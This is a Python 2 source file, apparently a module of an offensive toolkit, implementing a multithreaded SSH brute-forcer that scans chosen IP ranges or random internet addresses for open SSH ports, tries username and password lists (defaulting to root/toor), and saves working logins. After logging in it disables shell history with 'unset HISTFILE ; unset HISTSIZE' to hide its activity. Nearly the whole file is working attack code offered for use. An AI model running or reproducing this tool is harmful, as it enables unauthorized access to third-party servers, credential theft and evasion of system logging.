#!/usr/bin/env python
# -*- coding: latin-1 -*- 

from socket import *
import multiprocessing
import threading
import time
import paramiko
import sys
import os
import logging
import random
import re


class Main:
    __title__ = "SSH bruteforcer"
    __description__ = ""
    __menu_entry__ = "A multi-concurrent bruteforcer for crack SSH services"
    __version__ = "1.0"
    __menu_color__ = chr(27) + "[0;91m"

    def main(self):
        main()

def test_file(filename):
    try:
        outfile = open(filename, 'a')
        outfile.close()
    except IOError:
        print '[!] ERROR: cannot write to file \'%s\'' % filename
        sys.exit(1)

def argspage():

    args = {}

    print chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Choose your target selection:"
    print "     1-Single IP range"
    print "     2-Ip randomizing"

    rangeOption = int(raw_input())

    if rangeOption == 1:
        args["i"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Specify the IP address or address range (e.g.: 10.150-235.3.1-255): ")
    elif rangeOption == 2:
        args["r"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Introduce how many random IP's will you scan: " )

    args["p"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Specify the port of the service to atack (default: 22): ")
    if not args["p"]:
        args["p"] = 22

    args["t"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Specify how many threads did you want to launch per host (default: 4): ")
    if not args["t"]:
        args["t"] = 4

    args["f"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Max parallel host to be attacked at same time (default: 8): ")
    if not args["f"]:
        args["f"] = 8

    print chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Choose your input method for username:"
    print "     1-Single username"
    print "     2-List of usernames"
    userOption = int(raw_input())

    if userOption == 1:
        args["u"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Introduce the single username to use in cracking process(default: root): " )
        if not args["u"]:
            args["u"] = "root"
    elif userOption == 2:
        args["U"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Select the location of the file with the usernames list: " )

    print chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Choose your input method for password:"
    print "     1-Single password"
    print "     2-List of passwords"
    passOption = int(raw_input())
    if passOption == 1:
        args["l"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Introduce the single password to use in cracking process(default: toor): " )
        if not args["l"]:
            args["l"] = "toor"
    elif passOption == 2:
        args["L"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Select the location of the file with the password dictionary: " )

    print chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Did you want to write found login credentials to a file? (y/n)"
    foundOption = raw_input()
    if foundOption == "y":
        args["o"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Specify the path to the file that you will export the found credentials: " )
    elif foundOption == "n":
        print chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Avoiding exporting..."
    else:
        print chr(27) + "[0;91m" + "[-]" + chr(27) + "[0m" + " Bad option introduced, avoiding exporting..."

    print chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Did you want to write found IP's to a file? (y/n)"
    ipOption = raw_input()
    if ipOption == "y":
        args["O"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Specify the path to the file that you will export the found IP's: " )
    elif ipOption == "n":
        print chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Avoiding exporting..."
    else:
        print chr(27) + "[0;91m" + "[-]" + chr(27) + "[0m" + " Bad option introduced, avoiding exporting..."

    args["s"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Max parallel threads when port scanning (default: 200): ")
    if not args["s"]:
        args["s"] = 200

    args["T"] = raw_input(chr(27) + "[0;91m" + "[*]" + chr(27) + "[0m" + " Specify timeout in seconds (default: 3): ")
    if not args["T"]:
        args["T"] = 3

    return args


def write_to_file(filename, text):
    outfile = open(filename, 'a')
    outfile.write(text)
    outfile.close()


def scan(target, port, timeout, oips, HOSTLIST):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((target, port))
    sock.close()
    if result == 0:
        HOSTLIST.append(target)
        if oips:
            write_to_file(oips, target + '\n')


# control the maximum number of threads
def active_threads(threads, waittime):
    while threading.activeCount() > threads:
        time.sleep(waittime)



def thread_scan(args, target, HOSTLIST):
    port = int(args["p"])
    timeout = float(args["T"])
    if args.has_key("O"):
        oips = args["O"]
    else:
        oips = ""
    threads = int(args["s"])

    bam = threading.Thread(target=scan, args=(target, port, timeout, oips, HOSTLIST))
    bam.start()

    active_threads(threads, 0.0001)
    time.sleep(0.001)

def scan_output(i, HOSTLIST):
    sys.stdout.flush()
    sys.stdout.write('\r[*] Hosts scanned: {0} | possible to attack: {1}'.format(i, len(HOSTLIST)))

def check_targets(targets):
    if re.match(r'^[0-9.\-]*$', targets):
        return targets
    try:
        target = gethostbyname(targets)
        return target
    except gaierror:
        print '[-] \'%s\' is unreachable' % (targets)
        finished()
        sys.exit(1)

def unsort_hostlist(HOSTLIST):
    print '[*] unsort host list'
    for i in range(15):
        random.shuffle(HOSTLIST)

def handle_ip_range(iprange):
    parted = tuple(part for part in iprange.split('.'))

    rsa = range(4)
    rsb = range(4)
    for i in range(4):
        hyphen = parted[i].find('-')
        if hyphen != -1:
            rsa[i] = int(parted[i][:hyphen])
            rsb[i] = int(parted[i][1 + hyphen:]) + 1
        else:
            rsa[i] = int(parted[i])
            rsb[i] = int(parted[i]) + 1

    return (rsa, rsb)

def ip_range(args, HOSTLIST):
    targets = check_targets(args["i"])
    rsa, rsb = handle_ip_range(targets)

    print '[*] scanning %s for ssh services' % targets
    counter = 0
    for i in range(rsa[0], rsb[0]):
        for j in range(rsa[1], rsb[1]):
            for k in range(rsa[2], rsb[2]):
                for l in range(rsa[3], rsb[3]):
                    target = '%d.%d.%d.%d' % (i, j, k, l)
                    counter += 1
                    scan_output(counter, HOSTLIST)
                    thread_scan(args, target, HOSTLIST)

    active_threads(1, 0.1)

    scan_output(counter, HOSTLIST)
    print '\n[*] finished scan'


def randip():
    rand = range(4)
    for i in range(4):
        rand[i] = random.randrange(0, 256)

    if rand[0] == 127:
        randip()

    ipadd = '%d.%d.%d.%d' % (rand[0], rand[1], rand[2], rand[3])
    return ipadd


def rand_ip(args, HOSTLIST):
    i = 0
    print '[*] Scanning random ips for ssh services'
    while len(HOSTLIST) < int(args["r"]):
        i += 1
        scan_output(i, HOSTLIST)
        thread_scan(args, randip(), HOSTLIST)

    active_threads(1, 1)

    scan_output(i, HOSTLIST)
    print '\n[*] Finished scan.'


def file_exists(filename):
    try:
        open(filename).readlines()
    except IOError:
        print '[!] ERROR: cannot open file \'%s\'' % filename
        sys.exit(1)

def crack(target, port, user, passwd, outfile, timeo, i):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    user = user.replace('\n', '')
    passwd = passwd.replace('\n', '')
    try:
        ssh.connect(target, port=port, username=user, password=passwd,timeout=timeo, pkey=None, allow_agent=False)
        time.sleep(3)
        try:
            ssh.exec_command('unset HISTFILE ; unset HISTSIZE')
            time.sleep(1)
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('uname -a || cat /proc/version')
            output = 'Kernel: %s' % (ssh_stdout.readlines()[0].replace('\n', ''))
        except:
            output = 'info: maybe a honeypot or false positive'
        login = '[+] Login found for %s | %s:%s\n' \
                '[!] %s' % (target, user, passwd, output)
        print login
        if outfile:
            write_to_file(outfile, login + '\n')
        ssh.close()
        os._exit(0)
    except paramiko.AuthenticationException, e:
        ssh.close()
        exception = str(e)
        if '[\'publickey\']' in exception:
            print '[-] Key authentication only - stopped attack against %s' % (target)
            os._exit(1)
        elif '\'keyboard-interactive\'' in exception:
            print '[-] %s requires \'keyboard-interactive\' handler' % (target)
            os._exit(1)
    except:
        ssh.close()
        if i < 3:
            i += 1
            randtime = random.uniform(0.6, 1.2)
            time.sleep(randtime)
            crack(target, port, user, passwd, outfile, timeo, i)
        else:
            print '[-] Too many timeouts, stopped attack against %s' % (target)
            os._exit(1)


def thread_it(target, args):
    port = int(args["p"])
    if args.has_key("u"):
        user = args["u"]
        users = [user]
    elif args.has_key("U"):
        userlist = args["U"]
        users = open(userlist).readlines()
    if args.has_key("l"):
        password = args["l"]
        passwords = [password]
    elif args.has_key("L"):
        passlist = args["L"]
        passwords = open(passlist).readlines()
    if args.has_key("o"):
        outfile = args["o"]
    else:
        outfile = ""
    timeout = float(args["T"])
    threads = int(args["t"])

    try:
        for user in users:
            for password in passwords:
                Run = threading.Thread(target=crack, args=(target, port, user,password, outfile, timeout, 0,))
                Run.start()
                # checks that we a max number of threads
                active_threads(threads, 0.01)
                time.sleep(0.1)
        # waiting for the last running threads
        active_threads(1, 1)
    except KeyboardInterrupt:
        os._exit(1)


def fork_it(args, HOSTLIST):
    threads = int(args["t"])
    childs = int(args["f"])
    len_hosts = len(HOSTLIST)

    print '[*] attacking %d target(s)\n' \
          '[*] cracking up to %d hosts parallel\n' \
          '[*] threads per host: %d' % (len_hosts, childs, threads)

    i = 1
    for host in HOSTLIST:
        host = host.replace('\n', '')
        print '[*] performing attacks against %s [%d/%d]' % (host, i, len_hosts)
        hostfork = multiprocessing.Process(target=thread_it, args=(host, args))
        hostfork.start()
        while len(multiprocessing.active_children()) >= childs:
            time.sleep(0.001)
        time.sleep(0.001)
        i += 1


    while multiprocessing.active_children():
        time.sleep(1)


def empty_hostlist(HOSTLIST):
    if len(HOSTLIST) == 0:
        print '[-] found no targets to attack!'
        finished()
        sys.exit(1)


def finished():
    print '[*] Finishing.'


def main():
    args = argspage()
    HOSTLIST = []
    if args.has_key("U"):
        file_exists(args["U"])
    if args.has_key("L"):
        file_exists(args["L"])
    if args.has_key("o"):
        test_file(args["o"])
    if args.has_key("O"):
        test_file(args["O"])

    if args.has_key("i"):
        ip_range(args, HOSTLIST)
        unsort_hostlist()
    else:
        rand_ip(args, HOSTLIST)

    time.sleep(0.1)
    empty_hostlist(HOSTLIST)
    fork_it(args,HOSTLIST)
    finished()


if __name__ == '__main__':

    try:
        logging.disable(logging.CRITICAL)
        main()
    except KeyboardInterrupt:
        print '\nKeyboard interrupt received. Finishing...'
        time.sleep(0.2)
        os._exit(1)